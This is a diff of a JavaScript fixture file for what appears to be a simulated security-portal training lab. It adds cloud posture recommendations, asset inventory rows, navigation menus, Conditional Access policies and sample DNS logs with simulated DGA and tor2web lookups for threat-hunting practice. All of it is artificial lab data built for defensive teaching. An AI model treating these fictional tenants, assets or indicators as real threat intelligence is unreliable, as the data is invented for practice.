     severity:'low', threshold:'Score >= 0.65', tactics:['Collection','Exfiltration'],
     customization:'Disabled until summary-rule baselines have seven clean business days.',
+    modeNote:'Held in Flighting while the baseline stabilizes; will not reach Production until row quality is stable.',
     feeds:'Hunting queue only; do not create incidents until the baseline is stable.' },
-  { name:'Impossible travel with OAuth grant', status:'Enabled', source:'Fusion signal',
+  { name:'Impossible travel with OAuth grant', status:'Enabled', mode:'Production', source:'Fusion signal',
     severity:'high', threshold:'High anomalies only', tactics:['Initial Access','Persistence'],
     customization:'Create incidents only when an OAuth consent or risky app event occurs within 30 minutes.',
+    modeNote:'High-confidence path — running in Production and feeding Fusion incidents.',
     feeds:'Fusion incidents and the phishing-to-OAuth investigation path.' },
 ];
 
@@ -2475,25 +3176,83 @@ const MITRE_ATTCK = [
 
 const DEFENDER_CLOUD_RECS = [
   { id:'R-001', severity:'high', title:'Enable MFA for accounts with owner permissions on subscription',
-    control:'Enable MFA', resourceType:'Subscription', affected:1 },
+    control:'Enable MFA', resourceType:'Subscription', affected:1,
+    description:'A subscription owner can change access and security controls across the environment. Require strong, phishing-resistant authentication before that role can be used.',
+    remediation:['Review every principal assigned Owner at subscription scope.','Register an approved strong authentication method for the affected owner.','Require MFA for privileged access and validate the policy with a test sign-in.'],
+    assets:['sub-prod-001'], initiatives:['Cloud security benchmark','NIST SP 800-53 Rev. 5'],
+    riskFactors:['Privileged role','Broad subscription scope'], attackPath:'Standing Owner access can turn a compromised identity into control of production resources.' },
   { id:'R-002', severity:'high', title:'Storage accounts should disable public network access',
-    control:'Restrict unauthorized network access', resourceType:'Storage account', affected:4 },
+    control:'Restrict unauthorized network access', resourceType:'Storage account', affected:4,
+    description:'Public endpoints expand the routes an attacker can use to reach storage. Restrict connectivity to approved private or virtual-network paths.',
+    remediation:['Confirm each application has a private or approved network path.','Disable public network access on the affected storage accounts.','Test application access and review storage diagnostic logs after the change.'],
+    assets:['stcontosologs','stprodcustomer','stfinancearchive','stbuildartifacts'], initiatives:['Cloud security benchmark','PCI DSS 4.0'],
+    riskFactors:['Internet exposure','Sensitive data'], attackPath:'An internet-facing workload can pivot to publicly reachable storage and expose application data.' },
   { id:'R-003', severity:'high', title:'Management ports of virtual machines should be closed',
-    control:'Manage access and permissions', resourceType:'Virtual machine', affected:7 },
+    control:'Manage access and permissions', resourceType:'Virtual machine', affected:7,
+    description:'Direct SSH or RDP exposure increases the chance of password attacks and remote administration abuse. Use a controlled management path instead.',
+    remediation:['Inventory public inbound rules for SSH and RDP.','Remove broad management-port rules or replace them with an approved bastion, VPN, or just-in-time rule.','Verify the port is no longer reachable from an untrusted network.'],
+    assets:['vm-prod-web-01','vm-finance-02','vm-legacy-api','vm-build-01','vm-jump-east','vm-reporting-02','vm-ops-01'], initiatives:['Cloud security benchmark','CIS Azure Foundations Benchmark 2.0'],
+    riskFactors:['Internet exposure','Remote administration'], attackPath:'The active production attack path begins at the exposed SSH service on vm-prod-web-01.' },
   { id:'R-004', severity:'medium', title:'Diagnostic logs in Key Vault should be enabled',
-    control:'Enable auditing and logging', resourceType:'Key vault', affected:3 },
+    control:'Enable auditing and logging', resourceType:'Key vault', affected:3,
+    description:'Key vault audit events are needed to investigate secret access, configuration changes, and permission use.',
+    remediation:['Choose the security workspace or storage destination for each vault.','Enable the audit event category in diagnostic settings.','Run a test secret read and verify that the event arrives at the destination.'],
+    assets:['kv-prod-app','kv-finance','kv-build'], initiatives:['Cloud security benchmark','ISO/IEC 27001:2013'],
+    riskFactors:['Credential store','Detection gap'], attackPath:'Missing audit events reduce visibility when an identity reads secrets during an attack path.' },
   { id:'R-005', severity:'medium', title:'Just-in-time network access control should be applied on VMs',
-    control:'Manage access and permissions', resourceType:'Virtual machine', affected:5 },
+    control:'Manage access and permissions', resourceType:'Virtual machine', affected:5,
+    description:'Just-in-time access keeps management ports closed until an approved, time-bounded request opens them for a specific source.',
+    remediation:['Select the management ports required by administrators.','Configure allowed source ranges and a short maximum access duration.','Request test access, confirm it expires, and review the generated activity record.'],
+    assets:['vm-prod-web-01','vm-finance-02','vm-legacy-api','vm-reporting-02','vm-ops-01'], initiatives:['Cloud security benchmark'],
+    riskFactors:['Remote administration','Persistent exposure'], attackPath:'Time-bounded access removes the always-open management edge used by the VM attack path.' },
   { id:'R-006', severity:'medium', title:'Web Application Firewall should be enabled on App Gateway',
-    control:'Restrict unauthorized network access', resourceType:'App Gateway', affected:2 },
+    control:'Restrict unauthorized network access', resourceType:'App Gateway', affected:2,
+    description:'A web application firewall can inspect and block common application-layer attacks before traffic reaches a backend workload.',
+    remediation:['Attach an approved WAF policy to each affected gateway.','Start managed rules in detection mode and review false positives.','Move validated rules to prevention mode and monitor blocked requests.'],
+    assets:['agw-customer-prod','agw-partner-prod'], initiatives:['Cloud security benchmark','PCI DSS 4.0'],
+    riskFactors:['Public web endpoint','Application-layer attacks'], attackPath:'An unfiltered public request can reach application backends that hold customer data.' },
   { id:'R-007', severity:'low', title:'Container images should have vulnerability findings resolved',
-    control:'Remediate vulnerabilities', resourceType:'Container image', affected:23 },
+    control:'Remediate vulnerabilities', resourceType:'Container image', affected:23,
+    description:'Images with known vulnerable packages can carry exploitable code into running clusters. Prioritize findings in deployed images and rebuild from patched bases.',
+    remediation:['Identify affected images that are currently running.','Update the base image or vulnerable package and rebuild with a new immutable tag.','Rescan the image, deploy the fixed tag, and prevent reuse of the vulnerable tag.'],
+    assets:['acrprod.azurecr.io/api:2026.06','acrprod.azurecr.io/worker:2026.05','21 additional image findings'], initiatives:['Cloud security benchmark','NIST SP 800-53 Rev. 5'],
+    riskFactors:['Known exploit','Running workload'], attackPath:'The vulnerable API image is the likely entry point for the active aks-prod container attack path.' },
   { id:'R-008', severity:'low', title:'Defender for Servers Plan 2 should be enabled',
-    control:'Enable enhanced security features', resourceType:'Subscription', affected:1 },
+    control:'Enable enhanced security features', resourceType:'Subscription', affected:1,
+    description:'The enhanced server protection plan adds workload signals and assessment capabilities needed for deeper prevention and investigation.',
+    remediation:['Review cost and coverage requirements for the target subscription.','Enable the server protection plan for sub-dev-001.','Verify provisioning health and confirm protected machines begin reporting.'],
+    assets:['sub-dev-001'], initiatives:['Cloud security benchmark'],
+    riskFactors:['Coverage gap'], attackPath:'No active attack path is mapped; the finding represents reduced detection and posture coverage.' },
+];
+
+// Azure assets for the Defender for Cloud inventory. The Kubernetes row is a
+// cluster resource because its ARM ID identifies the managed cluster; the node
+// involved in the alert remains secondary investigation context.
+const CLOUD_ASSETS = [
+  { id:'azure-vm-prod-web-01', name:'vm-prod-web-01', type:'Virtual machine', subscription:'sub-prod-001', region:'westeurope',
+    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-web/providers/Cloud.Compute/virtualMachines/vm-prod-web-01',
+    risk:'High', exposure:'Internet exposed', alerts:2, recs:3,
+    alertResources:['vm-prod-web-01'] },
+  { id:'azure-aks-prod', name:'aks-prod', subLabel:'Alerted node: node-3', type:'Kubernetes cluster', subscription:'sub-prod-001', region:'westeurope',
+    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-aks/providers/Cloud.ContainerService/managedClusters/aks-prod',
+    risk:'High', exposure:'Privileged container path', alerts:3, recs:4,
+    alertResources:['aks-prod / pod-api-77','aks-prod/node-3','acrprod.azurecr.io/api'] },
+  { id:'azure-stcontosologs', name:'stcontosologs', type:'Storage account', subscription:'sub-prod-001', region:'westeurope',
+    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-data/providers/Cloud.Storage/storageAccounts/stcontosologs',
+    risk:'Medium', exposure:'Public network access', alerts:1, recs:2,
+    alertResources:['stcontosologs'] },
+  { id:'azure-sql-prod-reporting', name:'sql-prod-reporting', type:'SQL server', subscription:'sub-prod-001', region:'northeurope',
+    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-data/providers/Cloud.Sql/servers/sql-prod-reporting',
+    risk:'Medium', exposure:'Wide firewall rule', alerts:1, recs:2,
+    alertResources:['sql-prod-reporting'] },
+  { id:'azure-kv-prod-app', name:'kv-prod-app', type:'Key vault', subscription:'sub-prod-001', region:'westeurope',
+    resourceId:'/subscriptions/sub-prod-001/resourceGroups/rg-prod-app/providers/Cloud.KeyVault/vaults/kv-prod-app',
+    risk:'Low', exposure:'Unusual access location', alerts:1, recs:1,
+    alertResources:['kv-prod-app'] },
 ];
 
 const COMPLIANCE_FRAMEWORKS = [
-  { name:'Microsoft cloud security benchmark', percent:72, passing:181, failing:71 },
+  { name:'Cloud security benchmark', percent:72, passing:181, failing:71 },
   { name:'NIST SP 800-53 Rev. 5',              percent:58, passing:412, failing:298 },
   { name:'ISO/IEC 27001:2013',                 percent:64, passing:88,  failing:50 },
   { name:'PCI DSS 4.0',                        percent:51, passing:62,  failing:60 },
@@ -2601,11 +3360,11 @@ const EDISCOVERY_CONTENT_SEARCH = {
 
 const GRAPH_ACTIVITY_GUIDANCE = [
   { title:'Where it lives',
-    detail:'Microsoft Graph activity logs are collected through diagnostic settings, then queried from the configured Log Analytics workspace or routed into Sentinel.' },
+    detail:'Graph activity logs are collected through diagnostic settings, then queried from the configured Log Analytics workspace or routed into Sentinel.' },
   { title:'What it answers',
     detail:'Use the logs to see which app, user, operation, request URI, IP address, and result were observed after an OAuth consent or compromised-token event.' },
   { title:'How to enable in the lab story',
-    detail:'Create a diagnostic setting for Microsoft Graph activity logs, send it to the SOC workspace, then hunt the MicrosoftGraphActivityLogs fixture table below.' },
+    detail:'Create a diagnostic setting for Graph activity logs, send it to the SOC workspace, then hunt the GraphActivityLogs fixture table below.' },
 ];
 
 const RECORD_LABELS = [
@@ -2644,7 +3403,7 @@ const PURVIEW_SOLUTIONS = [
   { area:'Data Governance', name:'Data Lifecycle Management', route:'#/purview/lifecycle',
     detail:'Manage aging content, inactive locations, and retention-driven cleanup.' },
   { area:'Core', name:'Audit', route:'#/purview/audit',
-    detail:'Search Microsoft 365 audit events by operation, user, workload, and IP address.' },
+    detail:'Search 365 audit events by operation, user, workload, and IP address.' },
 ];
 
 const CLASSIC_PURVIEW_FEATURES = [
@@ -2657,7 +3416,7 @@ const CLASSIC_PURVIEW_FEATURES = [
 ];
 
 const PURVIEW_CONNECTED_SOURCES = [
-  { name:'Microsoft 365', status:'Connected', assets:186, icon:'M365' },
+  { name:'365', status:'Connected', assets:186, icon:'M365' },
   { name:'Azure', status:'Connected', assets:94, icon:'AZ' },
   { name:'Amazon Web Services', status:'Ready to connect', assets:0, icon:'AWS' },
   { name:'Snowflake', status:'Ready to connect', assets:0, icon:'SN' },
@@ -2809,17 +3568,19 @@ const FIELDS = [
 ];
 
 const PORTALS = [
-  { id:'defender',      name:'Microsoft Defender',          tag:'XDR · alerts, incidents, hunting',           color:'#0078d4', initial:'D' },
-  { id:'sentinel',      name:'Microsoft Sentinel',          tag:'SIEM · analytics rules, hunting, automation',color:'#0064bf', initial:'S' },
-  { id:'defender-cloud',name:'Microsoft Defender for Cloud',tag:'CSPM/CWPP · recommendations, compliance',    color:'#5c2d91', initial:'C' },
-  { id:'purview',       name:'Microsoft Purview',           tag:'Data security · DLP, insider risk, audit',   color:'#038387', initial:'P' },
+  { id:'defender',      name:'Defender',          tag:'XDR · alerts, incidents, hunting',           color:'#0078d4', initial:'D' },
+  { id:'sentinel',      name:'Sentinel',          tag:'SIEM · analytics rules, hunting, automation',color:'#0064bf', initial:'S' },
+  { id:'defender-cloud',name:'Defender for Cloud',tag:'CSPM/CWPP · recommendations, compliance',    color:'#5c2d91', initial:'C' },
+  { id:'purview',       name:'Purview',           tag:'Data security · DLP, insider risk, audit',   color:'#038387', initial:'P' },
   { id:'copilot',       name:'Security Copilot',            tag:'Standalone · sessions, promptbooks, plugins, knowledge', color:'#7a7574', initial:'SC' },
+  { id:'entra',         name:'Entra',             tag:'Identity · Conditional Access, Identity Protection', color:'#0b5cab', initial:'E' },
+  { id:'m365-admin',    name:'365 admin center',  tag:'Tenant admin · users, licenses, health, reports', color:'#7719aa', initial:'M365' },
 ];
 
-// Microsoft Cloud app launcher — same set surfaced by the waffle in security.microsoft.com.
+// Cloud app launcher — same set surfaced by the waffle in security.portal.example.
 // Shown in the outer pane across all workloads; current app gets highlighted by the renderer.
-const MICROSOFT_CLOUD_NAV = [
-  { label:'Microsoft Foundry',   icon:'🧪' },
+const CLOUD_NAV = [
+  { label:'Foundry',   icon:'🧪' },
   { label:'Azure',               icon:'🔷' },
   { label:'Copilot Studio',      icon:'🤖' },
   { label:'Data Explorer',       icon:'📊' },
@@ -2829,64 +3590,80 @@ const MICROSOFT_CLOUD_NAV = [
   { label:'Fabric',              icon:'🧵' },
   { label:'GitHub',              icon:'🐙' },
   { label:'Intune',              icon:'📱' },
-  { label:'Microsoft 365 Admin', icon:'🏢' },
+  { label:'365 Admin', icon:'🏢' },
   { label:'Power Automate',      icon:'🔁' },
   { label:'Power Platform',      icon:'⚡' },
   { label:'Purview',             icon:'📚' },
   { label:'Visual Studio Code',  icon:'🧩' },
-  { label:'Microsoft Sentinel',  icon:'🛰' },
+  { label:'Sentinel',  icon:'🛰' },
 ];
 
 const NAV = {
   defender: [
     { route:'#/defender/home',                  label:'Home',                    icon:'🏠' },
-    { route:'#/defender/exposure',              label:'Exposure management',     icon:'🎯' },
+    { section:'Exposure management' },
+    { route:'#/defender/exposure',              label:'Overview',                icon:'🎯' },
+    { route:'#/defender/secure-score',          label:'Secure score',            icon:'🛡' },
+    { route:'#/defender/vulnerabilities',       label:'Vulnerability management', icon:'🩹' },
     { section:'Investigation & response' },
+    { subsection:'Incidents & alerts' },
     { route:'#/defender/incidents',             label:'Incidents',               icon:'⛓' },
     { route:'#/defender/alerts',                label:'Alerts',                  icon:'⚠' },
     { route:'#/defender/cases',                 label:'Cases',                   icon:'📁' },
+    { route:'#/defender/alert-tuning',          label:'Alert tuning',            icon:'🎚' },
+    { subsection:'Hunting' },
     { route:'#/defender/hunting',               label:'Advanced hunting',        icon:'🔎' },
-    { route:'#/defender/custom-detections',     label:'Custom detections',       icon:'🧠' },
+    { route:'#/defender/custom-detections',     label:'Custom detection rules',  icon:'🧠' },
     { route:'#/defender/hunting-graph',         label:'Hunting graph (Preview)', icon:'🕸' },
+    { subsection:'Actions & submissions' },
     { route:'#/defender/action-center',         label:'Action center',           icon:'🧰' },
+    { route:'#/defender/air',                   label:'AIR center',              icon:'🤖' },
     { section:'Threat intelligence' },
     { route:'#/defender/threat-analytics',      label:'Threat analytics',        icon:'📊' },
     { route:'#/defender/intel-explorer',        label:'Intel explorer',          icon:'🛰' },
+    { route:'#/sentinel/threat-intel',          label:'Intel management',        icon:'🗂' },
     { section:'Assets' },
     { route:'#/defender/devices',               label:'Devices',                 icon:'💻' },
     { route:'#/defender/identities',            label:'Identities',              icon:'🆔' },
     { route:'#/defender/identity-protection',   label:'Identity protection',     icon:'🔐' },
+    { section:'Endpoints' },
+    { route:'#/defender/endpoints',             label:'Endpoint security ops',   icon:'💻' },
+    { route:'#/defender/asr-policy',            label:'ASR policies',            icon:'🚧' },
+    { section:'Email & collaboration' },
+    { route:'#/defender/email-collab',          label:'Email & collaboration',   icon:'✉' },
+    { route:'#/defender/threat-explorer',       label:'Threat explorer',         icon:'📧' },
+    { section:'Cloud apps' },
+    { route:'#/defender/cloud-apps',            label:'Cloud apps',              icon:'☁' },
     { section:'Microsoft Sentinel' },
     { route:'#/sentinel/home',                  label:'Overview',                icon:'🏠' },
-    { route:'#/sentinel/hunting',               label:'Search',                  icon:'🔎' },
-    { route:'#/sentinel/incidents',             label:'Threat management',       icon:'⛓' },
+    { route:'#/sentinel/search',                label:'Search',                  icon:'🔎' },
     { route:'#/sentinel/graph',                 label:'Sentinel Graph',          icon:'🕸' },
+    { subsection:'Threat management' },
+    { route:'#/sentinel/workbooks',             label:'Workbooks',               icon:'📓' },
+    { route:'#/sentinel/hunting',               label:'Hunting',                 icon:'🔎' },
+    { route:'#/sentinel/notebooks',             label:'Notebooks',               icon:'📔' },
+    { route:'#/sentinel/mitre',                 label:'MITRE ATT&CK',            icon:'🧭' },
+    { subsection:'Content management' },
+    { route:'#/sentinel/content-hub',           label:'Content hub',             icon:'🧱' },
+    { route:'#/sentinel/repositories',          label:'Repositories',            icon:'📚' },
+    { route:'#/sentinel/community',             label:'Community',               icon:'💬' },
+    { subsection:'Configuration' },
+    { route:'#/sentinel/data-connectors',       label:'Data connectors',         icon:'🔌' },
     { route:'#/sentinel/analytics',             label:'Analytics',               icon:'🧠' },
-    { section:'Content management' },
-    { route:'#/defender/content-hub',           label:'Content hub',             icon:'🧱' },
-    { route:'#/defender/repositories',          label:'Repositories',            icon:'📚' },
-    { route:'#/defender/community',             label:'Community',               icon:'💬' },
-    { section:'Configuration' },
-    { route:'#/defender/settings',              label:'Settings',                icon:'⚙' },
-    { route:'#/defender/mto',                   label:'Multi-tenant management', icon:'👥' },
-    { route:'#/defender/endpoints',             label:'Endpoints',               icon:'💻' },
-    { route:'#/defender/email-collab',          label:'Email & collaboration',   icon:'✉' },
-    { route:'#/defender/cloud-apps',            label:'Cloud apps',              icon:'☁' },
-    { route:'#/defender/secure-score',          label:'Secure score',            icon:'🛡' },
-    { route:'#/defender/suppression',           label:'Suppression rules',       icon:'🔕' },
-    { route:'#/defender/asr-policy',            label:'ASR policies',            icon:'🚧' },
-    { route:'#/defender/notifications',         label:'Email notifications',     icon:'📨' },
-    { route:'#/defender/alert-tuning',          label:'Alert tuning',            icon:'🎚' },
-    { route:'#/defender/air',                   label:'AIR center',              icon:'🤖' },
+    { route:'#/sentinel/watchlist',             label:'Watchlists',              icon:'👁' },
+    { route:'#/sentinel/automation',            label:'Automation',              icon:'⚙' },
     { section:'Other' },
     { route:'#/defender/reports',               label:'Reports',                 icon:'📑' },
     { route:'#/defender/learning-hub',          label:'Learning hub',            icon:'🎓' },
     { route:'#/defender/trials',                label:'Trials',                  icon:'🧪' },
+    { section:'System' },
+    { route:'#/defender/settings',              label:'Settings',                icon:'⚙' },
+    { route:'#/sentinel/settings',              label:'Microsoft Sentinel',      icon:'🛰' },
+    { route:'#/defender/device-discovery',      label:'Device discovery',        icon:'📡' },
+    { route:'#/defender/suppression',           label:'Suppression rules',       icon:'🔕' },
+    { route:'#/defender/notifications',         label:'Email notifications',     icon:'📨' },
+    { route:'#/defender/mto',                   label:'Multi-tenant management', icon:'👥' },
     // === local-tasks nav:defender ===
-    { section:'Email & collaboration' },
-    { route:'#/defender/threat-explorer', label:'Threat explorer', icon:'📧' },
-    { section:'Endpoints' },
-    { route:'#/defender/vulnerabilities', label:'Vulnerability management', icon:'🩹' },
   ],
   sentinel: [
     { section:'General' },
@@ -2944,7 +3721,7 @@ const NAV = {
     // === local-tasks nav:defender-cloud ===
   ],
   purview: [
-    { section:'Microsoft Purview' },
+    { section:'Purview' },
     { route:'#/purview/home',                   label:'Home',                  icon:'🏠' },
     { route:'#/purview/solutions',              label:'Solutions',             icon:'🧩' },
     { route:'#/purview/classic-governance',     label:'Classic governance',    icon:'🏛' },
@@ -2973,7 +3750,43 @@ const NAV = {
     { route:'#/copilot/settings',               label:'Settings',              icon:'⚙' },
     // === local-tasks nav:copilot ===
   ],
+  entra: [
+    { section:'Identity' },
+    { route:'#/entra/overview',                 label:'Overview',              icon:'🏠' },
+    { section:'Protection' },
+    { route:'#/entra/identity-protection',      label:'Identity Protection',  icon:'🛡' },
+    { route:'#/entra/conditional-access',       label:'Conditional Access',   icon:'🔐' },
+    // === local-tasks nav:entra ===
+  ],
+  'm365-admin': [
+    { route:'#/m365-admin/home',                label:'Home',                  icon:'🏠' },
+    { section:'Your organization' },
+    { route:'#/m365-admin/users',               label:'Users',                 icon:'👥' },
+    { route:'#/m365-admin/licenses',            label:'Billing › Licenses',    icon:'🪪' },
+    { section:'Reports' },
+    { route:'#/m365-admin/usage',               label:'Usage',                 icon:'📊' },
+    { section:'Health' },
+    { route:'#/m365-admin/service-health',      label:'Service health',        icon:'💚' },
+    { route:'#/m365-admin/message-center',      label:'Message center',        icon:'📣' },
+    { section:'Configuration' },
+    { route:'#/m365-admin/setup',               label:'Setup',                 icon:'🧩' },
+    { route:'#/m365-admin/admin-centers',       label:'Admin centers',         icon:'🧭' },
+  ],
 };
+
+// Seed Conditional Access policies shown in the Entra > Conditional Access list.
+const ENTRA_CA_POLICIES = [
+  { name:'CA001 - Require MFA for admins',       assignment:'Directory roles: 9 admin roles', conditions:'—',                              grant:'Require multifactor authentication', state:'On' },
+  { name:'CA002 - Block legacy authentication',  assignment:'All users',                      conditions:'Client apps: legacy',            grant:'Block access',                        state:'On' },
+];
+
+// Grant controls offered in the Conditional Access policy builder.
+const ENTRA_CA_GRANTS = [
+  { id:'block',     label:'Block access' },
+  { id:'mfa',       label:'Require multifactor authentication' },
+  { id:'pwd',       label:'Require password change' },
+  { id:'compliant', label:'Require device to be marked compliant' },
+];
 
 // ---------- ASIM DNS hunting (Sentinel) ----------
 // Source: ASIM DNS schema reference. _Im_Dns is the unifying parser; here we
@@ -2982,15 +3795,15 @@ const NAV = {
 // prefixes, ANY-type recon, DNS tunneling).
 const IM_DNS = [
   // Baseline benign traffic from corporate clients.
-  { TimeGenerated:'2026-06-29T07:55:01Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T07:55:01Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'github.com',
     DnsQueryTypeName:'A', DnsResponseName:'140.82.114.4' },
-  { TimeGenerated:'2026-06-29T07:55:14Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T07:55:14Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
-    SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'login.microsoftonline.com',
+    SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'login.identity.example',
     DnsQueryTypeName:'A', DnsResponseName:'20.190.137.40' },
-  { TimeGenerated:'2026-06-29T07:56:02Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T07:56:02Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'outlook.office365.com',
     DnsQueryTypeName:'A', DnsResponseName:'52.96.79.18' },
@@ -2998,47 +3811,47 @@ const IM_DNS = [
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.55', SrcHostname:'WKS-21', DstIpAddr:'10.0.0.10', DnsQuery:'raw.githubusercontent.com',
     DnsQueryTypeName:'A', DnsResponseName:'185.199.108.133' },
-  { TimeGenerated:'2026-06-29T07:58:30Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T07:58:30Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
-    SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'learn.microsoft.com',
+    SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'docs.security.example',
     DnsQueryTypeName:'A', DnsResponseName:'13.107.42.16' },
-  { TimeGenerated:'2026-06-29T08:00:00Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:00:00Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.41', SrcHostname:'WKS-17', DstIpAddr:'10.0.0.10', DnsQuery:'cdn.jsdelivr.net',
     DnsQueryTypeName:'A', DnsResponseName:'151.101.1.229' },
 
   // NXDOMAIN DGA burst from FIN-03 — tight time window, random labels.
-  { TimeGenerated:'2026-06-29T08:02:01Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:01Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'xk93lv2-mzpq.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:02:04Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:04Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'jq8z7nx-rmav.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:02:07Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:07Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'lzpq3rk-x4mq.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:02:09Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:09Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'pq3rkmz-9xq2.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:02:12Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:12Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'rkmz9xq2-pq3l.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:02:15Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:02:15Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'mz9xq2pq-3lkv.top',
     DnsQueryTypeName:'A', DnsResponseName:'' },
 
   // TOR proxy lookups — clear policy violation indicator.
-  { TimeGenerated:'2026-06-29T08:05:20Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:05:20Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'tor2web.org',
     DnsQueryTypeName:'A', DnsResponseName:'185.220.101.4' },
-  { TimeGenerated:'2026-06-29T08:05:25Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:05:25Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.88', SrcHostname:'WKS-DEV-04', DstIpAddr:'10.0.0.10', DnsQuery:'tor2web.com',
     DnsQueryTypeName:'A', DnsResponseName:'185.220.101.7' },
@@ -3052,11 +3865,11 @@ const IM_DNS = [
     DnsQueryTypeName:'A', DnsResponseName:'' },
 
   // Responses landing in suspicious IP prefixes — match by response_has_any_prefix.
-  { TimeGenerated:'2026-06-29T08:08:14Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:08:14Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
